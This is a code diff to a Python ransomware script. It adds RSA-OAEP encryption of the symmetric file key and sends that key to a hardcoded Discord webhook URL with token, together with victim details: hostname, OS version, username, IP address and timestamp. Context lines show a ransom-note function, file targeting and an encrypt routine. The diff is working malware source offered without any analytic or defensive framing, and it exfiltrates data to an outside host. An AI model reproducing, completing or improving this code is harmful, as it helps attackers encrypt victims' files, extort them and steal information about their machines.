@@ -23,6 +23,8 @@ import platform
 import socket
 import json
 from datetime import datetime
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
 
 user_os = "Windows"
 path_str = "\\"
@@ -30,6 +32,19 @@ computer_name = platform.node()
 if (platform.system() == "Darwin" or platform.system() == "Linux"):
     user_os = platform.system()
     path_str = "/"
+
+# Public RSA key (in PEM format) for encryption
+public_key_pem = b"""
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0boRMhV+Qj/xn/9GP7FP
+yyCTTeGxX38Kxss3RhEYml/nZrc3rKndEdb2FeMFLeAGBJsvytUmqhJUCGpx3kSB
+M/uEWJx0NhYqJ1etTrmGOY4JKiuwPCp9WICsLR6OioIBFTY/2Zz6dI8sPwgSx7gK
+dt5m+XS00xJ5Ln2+QcVBqOgWmmjcId+W4E58li4Q5UyniU+fLjbZrjR5DJm2O17Q
+8d/wkRGoLBNIMy/129PO2qnkxGWr0/5OxZQwuVep990Zp6vioeihmlllVSbNr7Rm
+vUgHuwuAB6n+8IlWRE5wEfrq0rNb718xhj1/AjmYXQ20xct1M6VXXtqa4NbjyAPo
+3wIDAQAB
+-----END PUBLIC KEY-----
+"""
 
 def create_ransom_note():
     # Define the ransom note content
@@ -111,14 +126,12 @@ def getFiles(directory):
 
     return target_files
 
-
 # def generateKey():
 #     key = Fernet.generate_key()
 #     with open("symmetric_key.key", "wb") as keyfile:
 #         keyfile.write(key)
 #     print("generated")
 #     send_key_to_discord(key)
-
 
 def generateKey():
     key_file_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "symmetric_key.key")
@@ -134,27 +147,92 @@ def generateKey():
     # Send the key to Discord or another location (your existing function)
     send_key_to_discord()
 
+def encryptKey(symmetric_key):
+    # Load the public key
+    public_key = serialization.load_pem_public_key(public_key_pem)
+    
+    # Encrypt the symmetric key with the RSA public key
+    encrypted_key = public_key.encrypt(
+        symmetric_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    return encrypted_key
+
+# def send_key_to_discord():
+#     # Replace with your Discord webhook URL
+#     discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'
+
+#     # Collect system information
+#     computer_name = platform.node()  # Hostname
+#     user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
+#     os_version = platform.version()  # OS Version
+#     current_user = os.getlogin()  # Username of the logged-in user
+#     ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
+#     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp
+
+#     # Open the symmetric_key.key file to attach
+#     key_file_path = f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key'
+#     files = {
+#         'file': ('symmetric_key.key', open(key_file_path, 'rb'))  # File part
+#     }
+
+#     # Construct the payload with system info (JSON data for the system info)
+#     data = {
+#         "content": "Symmetric Key and Victim Info",
+#         "embeds": [{
+#             "title": "Encryption Details",
+#             "fields": [
+#                 {"name": "Computer Name", "value": computer_name, "inline": True},
+#                 {"name": "Operating System", "value": user_os, "inline": True},
+#                 {"name": "OS Version", "value": os_version, "inline": True},
+#                 {"name": "Current User", "value": current_user, "inline": True},
+#                 {"name": "IP Address", "value": ip_address, "inline": True},
+#                 {"name": "Timestamp", "value": timestamp, "inline": True}
+#             ]
+#         }]
+#     }
+
+#     # Send the data to the Discord webhook along with the file
+#     try:
+#         # Use 'payload_json' for the JSON part and 'files' for the file attachment
+#         response = requests.post(discord_webhook_url, data={'payload_json': json.dumps(data)}, files=files)
+        
+#         if response.status_code == 204 or response.status_code == 200:
+#             print("Symmetric key file and victim info sent to Discord successfully.")
+#         else:
+#             print(f"Failed to send information to Discord. Status code: {response.status_code}")
+#             print(f"Response text: {response.text}")  # Debug response from Discord
+#     except Exception as e:
+#         print(f"Error sending information to Discord: {e}")
+#     finally:
+#         files['file'][1].close()  # Close the file after sending
+
 def send_key_to_discord():
-    # Replace with your Discord webhook URL
     discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'
 
     # Collect system information
-    computer_name = platform.node()  # Hostname
-    user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
-    os_version = platform.version()  # OS Version
-    current_user = os.getlogin()  # Username of the logged-in user
-    ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp
+    computer_name = platform.node()
+    user_os = platform.system()
+    os_version = platform.version()
+    current_user = os.getlogin()
+    ip_address = socket.gethostbyname(socket.gethostname())
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Open the symmetric_key.key file to attach
+    # Open the symmetric_key.key file and read its contents
     key_file_path = f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key'
-    files = {
-        'file': ('symmetric_key.key', open(key_file_path, 'rb'))  # File part
-    }
+    with open(key_file_path, 'rb') as key_file:
+        symmetric_key = key_file.read()
+    
+    # Encrypt the symmetric key using the public key
+    encrypted_key = encryptKey(symmetric_key)
 
-    # Construct the payload with system info (JSON data for the system info)
+    # Construct the payload with system info and encrypted symmetric key (base64 encoded)
     data = {
-        "content": "Symmetric Key and Victim Info",
+        "content": "Encrypted Symmetric Key and Victim Info",
         "embeds": [{
             "title": "Encryption Details",
             "fields": [
@@ -167,21 +245,24 @@ def send_key_to_discord():
             ]
         }]
     }
+    files = {
+        'file': ('encrypted_symmetric_key.bin', encrypted_key)  # Encrypted file part
+    }
 
-    # Send the data to the Discord webhook along with the file
+    # Send the data to the Discord webhook along with the encrypted file
     try:
-        # Use 'payload_json' for the JSON part and 'files' for the file attachment
         response = requests.post(discord_webhook_url, data={'payload_json': json.dumps(data)}, files=files)
         
         if response.status_code == 204 or response.status_code == 200:
-            print("Symmetric key file and victim info sent to Discord successfully.")
+            print("Encrypted symmetric key and victim info sent to Discord successfully.")
         else:
             print(f"Failed to send information to Discord. Status code: {response.status_code}")
-            print(f"Response text: {response.text}")  # Debug response from Discord
+            print(f"Response text: {response.text}")
     except Exception as e:
         print(f"Error sending information to Discord: {e}")
-    finally:
-        files['file'][1].close()  # Close the file after sending
+    # finally:
+    #     files['file'][1].close()  # Close the file after sending
+
 
 def encrypt(target):
     with open(f"{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
